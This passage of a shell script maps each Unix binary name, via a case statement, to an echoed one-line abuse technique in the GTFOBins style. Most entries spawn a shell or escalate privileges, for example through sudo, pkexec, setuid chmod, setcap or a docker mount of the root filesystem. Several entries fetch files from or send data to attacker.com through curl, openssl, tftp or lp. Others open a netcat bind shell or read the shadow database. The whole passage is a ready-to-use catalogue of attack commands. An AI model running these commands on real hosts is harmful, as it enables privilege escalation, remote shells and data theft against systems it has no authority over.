    aa-exec) echo 'aa-exec /bin/sh' ;;
    ab) echo 'ab -v2 http://attacker.com/path/to/input-file' ;;
    acr) echo 'echo -e '\''x:\\n\\t/bin/sh 1>&0 2>&0'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
acr -r ./relative/path/to/temp-file' ;;
    alpine) echo 'alpine -F /path/to/input-file' ;;
    ansible-playbook) echo 'echo '\''[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]'\'' >/path/to/temp-file
ansible-playbook /path/to/temp-file' ;;
    ansible-test) echo 'ansible-test shell' ;;
    aoss) echo 'aoss /bin/sh' ;;
    apache2) echo 'apache2 -f /path/to/input-file' ;;
    apache2ctl) echo 'apache2ctl -c '\''Include /path/to/input-file'\''' ;;
    apt-get) echo 'echo '\''Dpkg::Pre-Invoke {"/bin/sh;false"}'\'' >/path/to/temp-file
apt-get -y install -c /path/to/temp-file sl' ;;
    aptitude) echo 'aptitude changelog aptitude' ;;
    ar) echo 'ar r /path/to/output-file /path/to/input-file
ar p /path/to/output-file' ;;
    arch-nspawn) echo 'mkdir -p ./etc/
grep -oP "^CHROOT_VERSION='\''\\K[^'\'']+" /usr/share/devtools/lib/archroot.sh >.arch-chroot
touch ./etc/pacman.conf
echo '\''CARCH=true;/bin/sh;exit'\'' >etc/makepkg.conf
arch-nspawn .' ;;
    aria2c) echo 'echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
aria2c --on-download-error=/path/to/temp-file http://some-invalid-domain' ;;
    arj) echo 'arj a /path/to/output-file /path/to/input-file
arj p /path/to/output-file' ;;
    arp) echo 'arp -v -f /path/to/input-file' ;;
    as) echo 'as @/path/to/input-file' ;;
    ascii-xfr) echo 'ascii-xfr -ns /path/to/input-file' ;;
    ascii85) echo 'ascii85 /path/to/input-file | ascii85 --decode' ;;
    ash) echo 'ash' ;;
    aspell) echo 'aspell -c /path/to/input-file' ;;
    asterisk) echo 'asterisk -r
!/bin/sh' ;;
    at) echo 'echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null' ;;
    atobm) echo 'atobm /path/to/input-file' ;;
    autoconf) echo 'echo /bin/sh >/path/to/temp-file
chmod +x /path/to/temp-file
touch configure.ac
AUTOM4TE=/path/to/temp-file autoconf' ;;
    autoheader) echo 'echo '\''/bin/sh 1>&0'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
touch configure.ac
AUTOM4TE=/path/to/temp-file autoheader' ;;
    autoreconf) echo 'echo '\''/bin/sh 1>&0'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
echo AC_INIT >configure.ac
AUTOM4TE=/path/to/temp-file autoreconf' ;;
    aws) echo 'aws ec2 describe-instances --filter file:///path/to/input-file' ;;
    base32) echo 'base32 /path/to/input-file | base32 --decode' ;;
    base58) echo 'base58 /path/to/input-file | base58 --decode' ;;
    base64) echo 'base64 /path/to/input-file | base64 --decode' ;;
    basenc) echo 'basenc --base64 /path/to/input-file | basenc -d --base64' ;;
    basez) echo 'basez /path/to/input-file | basez --decode' ;;
    bash) echo 'bash' ;;
    bashbug) echo 'bashbug' ;;
    batcat) echo 'batcat --paging always /etc/hosts' ;;
    bbot) echo 'bbot -d -cy /path/to/input-file' ;;
    bc) echo 'bc -s /path/to/input-file
quit' ;;
    bconsole) echo 'bconsole
@exec /bin/sh' ;;
    borg) echo 'borg extract @:/::: --rsh "/bin/sh -c '\''/bin/sh </dev/tty >/dev/tty 2>/dev/tty'\''"' ;;
    bpftrace) echo 'bpftrace --unsafe -e '\''BEGIN {system("/bin/sh 1<&0");exit()}'\''' ;;
    bridge) echo 'bridge -b /path/to/input-file' ;;
    bundle) echo 'BUNDLE_GEMFILE=x bundle exec /bin/sh' ;;
    busctl) echo 'busctl set-property org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager LogLevel s debug --address=unixexec:path=/bin/sh,argv1=-c,argv2='\''/bin/sh -i 0<&2 1>&2'\''' ;;
    busybox) echo 'busybox ash' ;;
    byebug) echo 'byebug --no-stop /path/to/script.rb' ;;
    bzip2) echo 'bzip2 -c /path/to/input-file | bzip2 -d' ;;
    cabal) echo 'cabal exec --project-file=/dev/null -- /bin/sh' ;;
    cancel) echo 'cancel -h attacker.com:12345 -u DATA' ;;
    capsh) echo 'capsh --' ;;
    cargo) echo 'cargo help doc' ;;
    cat) echo 'cat /path/to/input-file' ;;
    cdist) echo 'cdist shell -s /bin/sh' ;;
    certbot) echo 'certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '\''/bin/sh 1>&0 2>&0'\''' ;;
    chattr) echo 'chattr +i /path/to/input-file' ;;
    check_by_ssh) echo 'check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C x' ;;
    check_cups) echo 'check_cups --extra-opts=@/path/to/input-file' ;;
    check_log) echo 'check_log -F /path/to/input-file -O /dev/stdout' ;;
    check_memory) echo 'check_memory --extra-opts=@/path/to/input-file' ;;
    check_raid) echo 'check_raid --extra-opts=@/path/to/input-file' ;;
    check_ssl_cert) echo 'echo '\''exec /bin/sh 0<&2 1>&2'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
check_ssl_cert --grep-bin /path/to/temp-file -H x' ;;
    check_statusfile) echo 'check_statusfile /path/to/input-file' ;;
    chmod) echo 'chmod 6777 /path/to/input-file' ;;
    choom) echo 'choom -n 0 /bin/sh' ;;
    chown) echo 'chown $(id -un):$(id -gn) /path/to/input-file' ;;
    chroot) echo 'chroot /' ;;
    chrt) echo 'chrt 1 /bin/sh' ;;
    clamscan) echo 'touch x.yara
clamscan --no-summary -d x.yara -f /path/to/input-file 2>&1 | sed -nE '\''s/^(.*): No such file or directory$/\\1/p'\''' ;;
    clisp) echo 'clisp -x '\''(ext:run-shell-command "/bin/sh")(ext:exit)'\''' ;;
    cmake) echo 'echo '\''execute_process(COMMAND /bin/sh)'\'' >/path/to/CMakeLists.txt
cmake /path/to/' ;;
    cmp) echo 'cmp /path/to/input-file /dev/zero -b -l' ;;
    cobc) echo 'echo '\''CALL "SYSTEM" USING "/bin/sh".'\'' >/path/to/temp-file
cobc -xFj --frelax-syntax-checks /path/to/temp-file' ;;
    code) echo 'code tunnel --name xxxxxx' ;;
    codex) echo 'codex sandbox linux /bin/sh' ;;
    column) echo 'column /path/to/input-file' ;;
    comm) echo 'comm /path/to/input-file /dev/null' ;;
    composer) echo 'echo '\''{"scripts":{"x":"/bin/sh"}}'\'' >composer.json
composer run-script x' ;;
    cowsay) echo 'cowsay -f /path/to/script.pl x' ;;
    cowthink) echo 'cowthink -f /path/to/script.pl x' ;;
    cp) echo 'cp /path/to/input-file /dev/stdout' ;;
    cpio) echo 'echo '\''/bin/sh </dev/tty >/dev/tty'\'' >localhost
cpio -o --rsh-command /bin/sh -F localhost:' ;;
    cpulimit) echo 'cpulimit -l 100 -f -- /bin/sh' ;;
    crash) echo 'CRASHPAGER=/path/to/command crash -h' ;;
    crontab) echo 'crontab -e' ;;
    csh) echo 'csh' ;;
    csplit) echo 'csplit /path/to/input-file 1
cat xx01' ;;
    csvtool) echo 'csvtool call '\''/bin/sh;false'\'' /etc/hosts' ;;
    ctr) echo 'ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x' ;;
    cupsfilter) echo 'cupsfilter -i application/octet-stream -m application/octet-stream /path/to/input-file' ;;
    curl) echo 'curl http://attacker.com/path/to/input-file -o /path/to/output-file' ;;
    cut) echo 'cut -d '\'''\'' -f1 /path/to/input-file' ;;
    dash) echo 'dash' ;;
    date) echo 'date -f /path/to/input-file' ;;
    dc) echo 'dc -e '\''!/bin/sh'\''' ;;
    dd) echo 'dd if=/path/to/input-file' ;;
    debugfs) echo 'debugfs
!/bin/sh' ;;
    dhclient) echo 'dhclient -sf /bin/sh' ;;
    dialog) echo 'dialog --textbox /path/to/input-file 0 0' ;;
    diff) echo 'diff --line-format=%L /dev/null /path/to/input-file' ;;
    dig) echo 'dig -f /path/to/input-file' ;;
    distcc) echo 'distcc /bin/sh' ;;
    dmesg) echo 'dmesg -rF /path/to/input-file' ;;
    dmsetup) echo 'dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '\''/bin/sh -s'\''' ;;
    dnf) echo 'dnf install -y x-1.0-1.noarch.rpm --disablerepo=*' ;;
    dnsmasq) echo 'dnsmasq --conf-script='\''/path/to/command 1>&2'\''' ;;
    doas) echo 'doas -u root /bin/sh' ;;
    docker) echo 'docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh' ;;
    dos2unix) echo 'dos2unix -f -O /path/to/input-file' ;;
    dosbox) echo 'dosbox -c '\''mount c /'\'' -c '\''type c:\\path\\to\\input'\''' ;;
    dotnet) echo 'dotnet fsi
System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;' ;;
    dpkg) echo 'dpkg -i x_1.0_all.deb' ;;
    dstat) echo 'dstat --xxx' ;;
    dvips) echo 'dvips -R0 texput.dvi' ;;
    easyrsa) echo 'echo '\''set_var X "$(/bin/sh 1>&0)"'\'' >/path/to/temp-file
easyrsa --vars=/path/to/temp-file' ;;
    eb) echo 'eb logs' ;;
    ed) echo 'ed
!/bin/sh
q' ;;
    efax) echo 'efax -d /path/to/input-file' ;;
    egrep) echo 'grep '\'''\'' /path/to/input-file' ;;
    elvish) echo 'elvish' ;;
    emacs) echo 'emacs -Q -nw --eval '\''(term "/bin/sh")'\''' ;;
    enscript) echo 'enscript /dev/null -qo /dev/null -I '\''/bin/sh >&2'\''' ;;
    env) echo 'env /bin/sh' ;;
    eqn) echo 'eqn /path/to/input-file' ;;
    espeak) echo 'espeak -qXf /path/to/input-file' ;;
    ex) echo 'ex -c '\'':!/bin/sh'\''' ;;
    exiftool) echo 'exiftool -filename=/path/to/output-file /path/to/input-file
cat /path/to/output-file' ;;
    expand) echo 'expand /path/to/input-file' ;;
    expect) echo 'expect -c '\''spawn /bin/sh;interact'\''' ;;
    facter) echo 'FACTERLIB=/path/to/dir/ facter' ;;
    fail2ban-client) echo 'fail2ban-client add x
fail2ban-client set x addaction x
fail2ban-client set x action x actionban /path/to/command
fail2ban-client start x
fail2ban-client set x banip 999.999.999.999
fail2ban-client set x unbanip 999.999.999.999
fail2ban-client stop x' ;;
    fastfetch) echo 'echo '\''{"modules":[{"type":"command","key":"x","text":"exec /bin/sh 1>&0 2>&0"}]}'\'' >/path/to/temp-file.jsonc
fastfetch -c /path/to/temp-file.jsonc' ;;
    ffmpeg) echo 'ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav
reset^J' ;;
    fgrep) echo 'grep '\'''\'' /path/to/input-file' ;;
    file) echo 'file -f /path/to/input-file' ;;
    find) echo 'find . -exec /bin/sh \\; -quit' ;;
    finger) echo 'finger x@attacker.com' ;;
    firejail) echo 'firejail /bin/sh' ;;
    fish) echo 'fish' ;;
    flock) echo 'flock -u / /bin/sh' ;;
    fmt) echo 'fmt -pNON_EXISTING_PREFIX /path/to/input-file' ;;
    fold) echo 'fold -w999 /path/to/input-file' ;;
    forge) echo 'echo '\''#!/bin/sh'\'' >/path/to/temp-file
echo -e "/bin/sh <$(tty) >$(tty) 2>$(tty)" >>/path/to/temp-file
chmod +x /path/to/temp-file
forge build --use /path/to/temp-file' ;;
    fping) echo 'fping -f /path/to/input-file' ;;
    ftp) echo 'ftp
!/bin/sh' ;;
    fzf) echo 'fzf --bind '\''enter:execute(/bin/sh)'\''' ;;
    gawk) echo 'gawk '\''BEGIN {system("/bin/sh")}'\''' ;;
    gcc) echo 'gcc -wrapper /bin/sh,-s x' ;;
    gcloud) echo 'gcloud help' ;;
    gcore) echo 'gcore $PID' ;;
    gdb) echo 'gdb -nx -ex '\''dump value /path/to/output-file "DATA"'\'' -ex quit' ;;
    gem) echo 'gem open -e '\''/bin/sh -s'\'' debug' ;;
    genie) echo 'genie -c '\''/bin/sh'\''' ;;
    genisoimage) echo 'genisoimage -q -o - /path/to/input-file' ;;
    getent) echo 'getent shadow' ;;
    ghc) echo 'ghc -e '\''System.Process.callCommand "/bin/sh"'\''' ;;
    ghci) echo 'ghci
System.Process.callCommand "/bin/sh"' ;;
    ginsh) echo 'ginsh
!/bin/sh' ;;
    git) echo 'PAGER='\''/bin/sh -c "exec sh 0<&1"'\'' git -p help' ;;
    gnuplot) echo 'gnuplot -e '\''system("/bin/sh 1>&0")'\''' ;;
    go) echo 'echo -e '\''package main\\nimport "syscall"\\nfunc main(){\\n\\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, []string{})\\n}'\'' >/path/to/temp-file.go
go run /path/to/temp-file.go' ;;
    grc) echo 'grc --pty /bin/sh' ;;
    grep) echo 'grep '\'''\'' /path/to/input-file' ;;
    gtester) echo 'echo '\''exec /bin/sh 0<&1'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
gtester -q /path/to/temp-file' ;;
    guile) echo 'guile -c '\''(system "/bin/sh")'\''' ;;
    gzip) echo 'gzip -c /path/to/input-file | gzip -d' ;;
    hashcat) echo 'echo -n DATA | tee /path/to/wordlist | md5sum | awk '\''{print $1}'\'' >/path/to/hash
hashcat -m 0 --quiet --potfile-disable -o /path/to/output-file --outfile-format=2 --outfile-autohex-disable /path/to/hash /path/to/wordlist' ;;
    head) echo 'head -c-0 /path/to/input-file' ;;
    hexdump) echo 'hd /path/to/input-file' ;;
    hg) echo 'hg --config alias.x='\''!/bin/sh'\'' x' ;;
    highlight) echo 'highlight --no-doc --failsafe /path/to/input-file' ;;
    hping3) echo 'hping3
/bin/sh' ;;
    iconv) echo 'iconv -f 8859_1 -t 8859_1 /path/to/input-file' ;;
    iftop) echo 'iftop
!/bin/sh' ;;
    install) echo 'install -m 6777 /path/to/input-file /path/to/output-dir/' ;;
    ionice) echo 'ionice /bin/sh' ;;
    ip) echo 'ip netns add foo
ip netns exec foo /bin/sh
ip netns delete foo' ;;
    iptables-save) echo 'iptables -A INPUT -i lo -j ACCEPT -m comment --comment DATA
iptables -S
iptables-save -f /path/to/output-file' ;;
    ispell) echo 'ispell /etc/hosts
!/bin/sh' ;;
    java) echo 'java Shell' ;;
    jjs) echo 'jjs
Java.type('\''java.lang.Runtime'\'').getRuntime().exec('\''/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty'\'').waitFor()' ;;
    joe) echo 'joe
^K!/bin/sh' ;;
    join) echo 'join -a 2 /dev/null /path/to/input-file' ;;
    journalctl) echo 'journalctl' ;;
    jq) echo 'jq -Rr . /path/to/input-file' ;;
    jrunscript) echo 'jrunscript -e '\''exec("/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty")'\''' ;;
    jshell) echo 'jshell
Runtime.getRuntime().exec("/path/to/command");' ;;
    jtag) echo 'jtag --interactive
shell /bin/sh' ;;
    julia) echo 'julia -e '\''run(`/bin/sh`)'\''' ;;
    ksshell) echo 'ksshell -i /path/to/input-file' ;;
    ksu) echo 'ksu -q -e /bin/sh' ;;
    kubectl) echo 'cat >/path/to/temp-file <<EOF
clusters:
- cluster:
    server: https://x
  name: x
contexts:
- context:
    cluster: x
    user: x
  name: x
current-context: x
users:
- name: x
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      interactiveMode: Always
      command: /bin/sh
      args:
        - '\''-c'\''
        - '\''/bin/sh 0<&2 1>&2'\''
EOF

kubectl get pods --kubeconfig=/path/to/temp-file' ;;
    last) echo 'last -a -f /path/to/input-file' ;;
    latex) echo 'latex --shell-escape '\''\\immediate\\write18{/bin/sh}'\''' ;;
    latexmk) echo 'echo '\''\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/path/to/input-file}\\end{document}'\'' >/path/to/temp-file
latexmk -dvi /path/to/temp-file
strings temp-file.dvi' ;;
    ld.so) echo '/path/to/ld.so /bin/sh' ;;
    ldconfig) echo 'echo /path/to/temp-dir/ >/path/to/temp-file
ldconfig -f /path/to/temp-file
ping' ;;
    less) echo 'less /etc/hosts
!/bin/sh' ;;
    lftp) echo 'lftp -c '\''!/bin/sh'\''' ;;
    links) echo 'links /path/to/input-file' ;;
    ln) echo 'ln -fs /bin/sh /bin/ln
ln' ;;
    loginctl) echo 'loginctl user-status
!/bin/sh' ;;
    logrotate) echo 'echo -e '\''/path/to/temp-file.config {\\nmail x@x.x\\n}'\'' >/path/to/temp-file.config
echo '\''/bin/sh 0<&2 1>&2'\'' >/path/to/temp-file.sh
logrotate -m /path/to/temp-file.sh -f /path/to/temp-file' ;;
    logsave) echo 'logsave /dev/null /bin/sh -i' ;;
    look) echo 'look '\'''\'' /path/to/input-file' ;;
    lp) echo 'lp /path/to/input-file -h attacker.com' ;;
    ltrace) echo 'ltrace -b -L /bin/sh' ;;
    lua) echo 'lua -e '\''os.execute("/bin/sh")'\''' ;;
    lwp-download) echo 'lwp-download http://attacker.com/path/to/input-file /path/to/output-file' ;;
    lwp-request) echo 'lwp-request file:///path/to/input-file' ;;
    lxd) echo 'lxc init ubuntu:16.04 x -c security.privileged=true
lxc config device add x x disk source=/ path=/mnt/ recursive=true
lxc start x
lxc exec x /bin/sh' ;;
    m4) echo 'echo '\''esyscmd(/bin/sh 0<&2 1>&2)'\'' | m4' ;;
    mail) echo 'mail --exec='\''!/bin/sh'\''' ;;
    make) echo 'make --eval='\''$(shell /bin/sh 1>&0)'\'' .' ;;
    man) echo 'man '\''-H/bin/sh #'\'' man' ;;
    mawk) echo 'mawk '\''BEGIN {system("/bin/sh")}'\''' ;;
    minicom) echo 'minicom -D /dev/null' ;;
    more) echo 'more /etc/hosts
!/bin/sh' ;;
    mosh-server) echo 'mosh --server=mosh-server localhost /bin/sh' ;;
    mosquitto) echo 'mosquitto -c /path/to/input-file' ;;
    mount) echo 'mount -o bind /bin/sh /bin/mount
mount' ;;
    msfconsole) echo 'msfconsole
irb' ;;
    msgattrib) echo 'msgattrib -P /path/to/input-file' ;;
    msgcat) echo 'msgcat -P /path/to/input-file' ;;
    msgconv) echo 'msgconv -P /path/to/input-file' ;;
    msgfilter) echo 'echo x | msgfilter -P /bin/sh -c '\''/bin/sh 0<&2 1>&2; kill $PPID'\''' ;;
    msgmerge) echo 'msgmerge -P /path/to/input-file /dev/null' ;;
    msguniq) echo 'msguniq -P /path/to/input-file' ;;
    mtr) echo 'mtr --raw -F /path/to/input-file' ;;
    multitime) echo 'multitime /bin/sh' ;;
    mutt) echo 'mutt -F /path/to/input-file' ;;
    mv) echo 'echo DATA >/path/to/temp-file
mv /path/to/temp-file /path/to/output-file' ;;
    mypy) echo 'mypy /path/to/input-file' ;;
    mysql) echo 'mysql -e '\''\\! /bin/sh'\''' ;;
    nano) echo 'nano
^R^X
reset; sh 1>&0 2>&0' ;;
    nasm) echo 'nasm -@ /path/to/input-file' ;;
    nc) echo 'nc -l -p 12345 -e /bin/sh' ;;
    ncdu) echo 'ncdu
b' ;;
    ncftp) echo 'ncftp
!/bin/sh' ;;
    neofetch) echo 'echo '\''exec /bin/sh'\'' >/path/to/temp-file
neofetch --config /path/to/temp-file' ;;
    nft) echo 'nft -f /path/to/input-file' ;;
    nginx) echo 'cat >/path/to/temp-file <<EOF
user root;
http {
  server {
    listen 80;
    root /;
    autoindex on;
    dav_methods PUT;
  }
}
events {}
EOF

nginx -c /path/to/temp-file' ;;
    nice) echo 'nice /bin/sh' ;;
    nl) echo 'nl -bn -w1 -s '\'''\'' /path/to/input-file' ;;
    nm) echo 'nm /path/to/input-file' ;;
    nmap) echo 'nmap -iL /path/to/input-file' ;;
    node) echo 'node -e '\''require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'\''' ;;
    nohup) echo 'nohup /bin/sh -c '\''/bin/sh </dev/tty >/dev/tty 2>/dev/tty'\''' ;;
    npm) echo 'npm exec /bin/sh' ;;
    nroff) echo 'echo /bin/sh >groff
chmod +x groff
GROFF_BIN_PATH=. nroff' ;;
    nsenter) echo 'nsenter /bin/sh' ;;
    ntpdate) echo 'ntpdate -a x -k /path/to/input-file -d localhost' ;;
    octave) echo 'octave-cli --eval '\''system("/bin/sh")'\''' ;;
    od) echo 'od -An -c -w999 /path/to/input-file' ;;
    opencode) echo 'opencode
! /path/to/command' ;;
    openssl) echo 'openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file' ;;
    openvpn) echo 'openvpn --dev null --script-security 2 --up '\''/bin/sh -s'\''' ;;
    openvt) echo 'openvt -- /path/to/command' ;;
    opkg) echo 'rpm opkg install x_1.0_all.deb' ;;
    pandoc) echo 'pandoc -t plain /path/to/input-file' ;;
    passwd) echo 'echo -e '\''x\\nx'\'' | passwd' ;;
    paste) echo 'paste /path/to/input-file' ;;
    pax) echo 'pax -w /path/to/input-file | tar -xO' ;;
    pdflatex) echo 'pdflatex --shell-escape '\''\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\''' ;;
    pdftex) echo 'pdftex --shell-escape '\''\\write18{/bin/sh}\\end'\''' ;;
    perf) echo 'perf stat /bin/sh' ;;
    perl) echo 'perl -e '\''exec "/bin/sh"'\''' ;;
    perlbug) echo 'perlbug -s '\''x x x'\'' -r x -c x -e '\''exec /bin/sh #'\''' ;;
    pexec) echo 'pexec /bin/sh' ;;
    pg) echo 'pg /etc/hosts
!/bin/sh' ;;
    php) echo 'php -r '\''system("/bin/sh -i");'\''' ;;
    pic) echo 'pic -U
.PS
sh X sh X' ;;
    pidstat) echo 'pidstat -e /bin/sh' ;;
    pkexec) echo 'pkexec /bin/sh' ;;
    pkg) echo 'pkg install -y --no-repo-update ./x-1.0.txz' ;;
    plymouth) echo 'plymouth ask-for-password --prompt=x --command=/bin/sh' ;;
    podman) echo 'podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh' ;;
    posh) echo 'posh' ;;
    pr) echo 'pr -T /path/to/input-file' ;;
    procmail) echo 'echo -e '\'':0\\n| /path/to/command >/path/to/temp-file
procmail -m /path/to/temp-file' ;;
    pry) echo 'pry' ;;
    psftp) echo 'psftp
!/bin/sh' ;;
    psql) echo 'psql
\\! /bin/sh' ;;
    ptx) echo 'ptx -w 999 /path/to/input-file' ;;
    puppet) echo 'puppet apply -e "exec { '\''/bin/sh <$(tty) >$(tty) 2>$(tty)'\'': }"' ;;
    pwsh) echo 'pwsh' ;;
    pygmentize) echo 'pygmentize -l text /path/to/input-file' ;;
    pyright) echo 'pyright /path/to/input-file' ;;
    python) echo 'python -c '\''import os; os.execl("/bin/sh", "sh")'\''' ;;
    qpdf) echo 'qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file
qpdf --show-attachment=x /path/to/output-file' ;;
    rake) echo 'rake -f /path/to/input-file' ;;
    ranger) echo 'ranger
S' ;;
    rc) echo 'rc' ;;
    readelf) echo 'readelf -a @/path/to/input-file' ;;
    redcarpet) echo 'redcarpet /path/to/input-file' ;;
    redis) echo 'redis-cli -h 127.0.0.1
config set dir /path/to/output-dir/
config set dbfilename output-file
set x "DATA"
save' ;;
    restic) echo 'RESTIC_PASSWORD_COMMAND='\''/bin/sh -c "/bin/sh 0<&2 1<&2"'\'' restic backup' ;;
    rev) echo 'rev /path/to/input-file | rev' ;;
    rlogin) echo 'rlogin -l DATA -p 12345 attacker.com' ;;
    rlwrap) echo 'rlwrap /bin/sh' ;;
    rpm) echo 'rpm -ivh x-1.0-1.noarch.rpm' ;;
    rsync) echo 'rsync -e '\''/bin/sh -c "/bin/sh 0<&2 1>&2"'\'' x:x' ;;
    rsyslogd) echo 'cat >/path/to/temp-file <<EOF
module(load="imuxsock")
:msg, contains, "somerandomstring" ^/path/to/command
EOF

rsyslogd -f /path/to/temp-file' ;;
    rtorrent) echo 'echo '\''execute = /bin/sh,-c,"/bin/sh </dev/tty >/dev/tty 2>/dev/tty"'\'' >~/.rtorrent.rc
rtorrent' ;;
    ruby) echo 'ruby -e '\''exec "/bin/sh"'\''' ;;
    run-mailcap) echo 'run-mailcap --action=view text/plain:/etc/hosts' ;;
    run-parts) echo 'run-parts --new-session --regex '\''^sh$'\'' /bin' ;;
    runscript) echo 'echo '\''! exec /bin/sh'\'' >/path/to/temp-file
runscript /path/to/temp-file' ;;
    rustc) echo 'rustc /path/to/input-file' ;;
    rustdoc) echo 'rustdoc /path/to/input-file' ;;
    rustfmt) echo 'rustfmt /path/to/input-file' ;;
    rustup) echo 'mkdir /path/to/temp-dir/bin/
mkdir /path/to/temp-dir/lib/
cp /bin/sh /path/to/temp-dir/bin/rustc
rustup toolchain link x /path/to/temp-dir/
rustup run x rustc' ;;
    sash) echo 'sash' ;;
    scanmem) echo 'scanmem
shell /bin/sh' ;;
    scp) echo 'echo '\''exec /bin/sh 0<&2 1>&2'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
scp -S /path/to/temp-file x x:' ;;
    screen) echo 'screen' ;;
    script) echo 'script -q /dev/null' ;;
    scrot) echo 'scrot -e /bin/sh' ;;
    sed) echo 'sed -n '\''1e exec /bin/sh 1>&0'\'' /etc/hosts' ;;
    service) echo 'service ../../bin/sh' ;;
    setarch) echo 'setarch -3 /bin/sh' ;;
    setcap) echo 'setcap cap_setuid+ep /path/to/command' ;;
    setfacl) echo 'setfacl -m u:$(id -un):rwx /path/to/input-file' ;;
    setlock) echo 'setlock - /bin/sh' ;;
    sftp) echo 'sftp user@attacker.com
!/bin/sh' ;;
    sg) echo 'sg root' ;;
    shred) echo 'shred -u /path/to/output-file' ;;
    shuf) echo 'shuf -z /path/to/input-file' ;;
    slsh) echo 'slsh -e '\''system("/bin/sh")'\''' ;;
    smbclient) echo 'smbclient '\''\\\\host\\share'\''
!/bin/sh' ;;
    snap) echo 'snap install xxxx_1.0_all.snap --dangerous --devmode' ;;
    socat) echo 'socat - exec:/bin/sh,pty,ctty,raw,echo=0' ;;
    socket) echo 'socket -svp '\''/bin/sh -i'\'' 12345' ;;
    soelim) echo 'soelim /path/to/input-file' ;;
    softlimit) echo 'softlimit /bin/sh' ;;
    sort) echo 'sort -m /path/to/input-file' ;;
    split) echo 'split --filter='\''/bin/sh -i 0<&2 1>&2'\'' /etc/hosts' ;;
    sqlite3) echo 'sqlite3 /dev/null '\''.shell /bin/sh'\''' ;;
    ss) echo 'ss -a -F /path/to/input-file' ;;
    ssh) echo 'ssh localhost /bin/sh' ;;
    ssh-agent) echo 'ssh-agent /bin/sh' ;;
    ssh-copy-id) echo 'ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com' ;;
    ssh-keygen) echo 'ssh-keygen -D /path/to/lib.so' ;;
    ssh-keyscan) echo 'ssh-keyscan -f /path/to/input-file' ;;
    sshfs) echo 'echo -e '\''/bin/sh </dev/tty >/dev/tty 2>/dev/tty'\'' >/path/to/temp-file
chmod +x /path/to/temp-file
sshfs -o ssh_command=/path/to/temp-file x: /path/to/dir/' ;;
    sshpass) echo 'sshpass /bin/sh' ;;
    sshuttle) echo 'sudo sshuttle -r x --ssh-cmd '\''/bin/sh -c "/bin/sh 0<&2 1>&2"'\'' localhost' ;;
    start-stop-daemon) echo 'start-stop-daemon -S -x /bin/sh' ;;
    stdbuf) echo 'stdbuf -i0 /bin/sh' ;;
    strace) echo 'strace -o /dev/null /bin/sh' ;;
    strings) echo 'strings /path/to/input-file' ;;
    su) echo 'su -c /bin/sh' ;;
    sudo) echo 'sudo /bin/sh' ;;
    sysctl) echo 'sysctl '\''kernel.core_pattern=|/path/to/command'\''' ;;
    systemctl) echo 'echo '\''[Service]
Type=oneshot
ExecStart=/path/to/command
[Install]
WantedBy=multi-user.target'\'' >/path/to/temp-file.service
systemctl link /path/to/temp-file.service
systemctl enable --now /path/to/temp-file.service' ;;
    systemd-resolve) echo 'systemd-resolve --status' ;;
    systemd-run) echo 'systemd-run -S' ;;
    tac) echo 'tac -s '\''RANDOM'\'' /path/to/input-file' ;;
    tail) echo 'tail -c+0 /path/to/input-file' ;;
    tailscale) echo 'tailscale serve --http=12345 /path/to/input-file' ;;
    tar) echo 'tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh' ;;
    task) echo 'task execute /bin/sh' ;;
    taskset) echo 'taskset 1 /bin/sh' ;;
    tasksh) echo 'tasksh
!/bin/sh' ;;
    tbl) echo 'tbl /path/to/input-file' ;;
    tclsh) echo 'tclsh' ;;
    tcpdump) echo 'echo /path/to/command >/path/to/temp-file
chmod +x /path/to/temp-file
tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /path/to/temp-file -Z root' ;;
    tcsh) echo 'tcsh' ;;
    tdbtool) echo 'tdbtool
! /bin/sh' ;;
    tee) echo 'echo DATA | tee /path/to/output-file' ;;
    telnet) echo 'telnet
!/bin/sh' ;;
    terraform) echo 'terraform console
file("/path/to/input-file")' ;;
    tex) echo 'tex --shell-escape '\''\\immediate\\write18{/bin/sh}'\''' ;;
    tftp) echo 'tftp attacker.com
get /path/to/input-file' ;;
    tic) echo 'tic -C /path/to/input-file' ;;
    time) echo 'time /bin/sh' ;;
    timedatectl) echo 'timedatectl list-timezones' ;;
    timeout) echo 'timeout 0 /bin/sh' ;;
    tmate) echo 'tmate -c /bin/sh' ;;
    tmux) echo 'tmux -c /bin/sh' ;;
    top) echo 'echo -e '\''pipe\\tx\\texec /bin/sh 1>&0 2>&0'\'' >>~/.config/procps/toprc
top
# press return twice
reset' ;;
    torify) echo 'torify /bin/sh' ;;
    torsocks) echo 'torsocks /bin/sh' ;;
    troff) echo 'troff /path/to/input-file' ;;
    tsc) echo 'tsc /path/to/input-file.ts' ;;
    ul) echo 'ul /path/to/input-file' ;;
